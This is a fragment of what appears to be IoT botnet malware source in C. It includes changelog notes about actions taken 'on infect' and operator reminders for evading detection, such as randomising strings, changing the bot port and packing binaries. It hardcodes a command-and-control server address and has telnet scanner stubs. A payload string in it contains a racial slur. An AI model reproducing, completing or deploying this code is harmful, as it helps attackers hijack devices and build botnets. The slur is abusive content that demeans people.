...
7.0:
Decided to add Clean and Update Name Servers back on infect.
...
Stability Reminders:
Change the Alphabet Rand String on Line 286, remember to keep it 31 chars with only lowercase letters and numbers
Edit your botport to something random
Pack your bins 
Dont use the default bin names ( If you use the execution compiler you should be good for a while )
...
unsigned char *ServerInfo[] = {"157.230.23.155:23"};
char *BusyBoxPayload = "Nigger"; // Dont even turn on
char *usernames[] = {
	"Dont Use the Telnet Scanner",
...
void rand_alphastr(uint8_t *str, int len) {
	const char alphaset[] = "zxry3gdqbbr6lzncrmpvqypeuaqzfrv"; //(randomize everytime you recompile) 31 chars
	while (len > 0) {
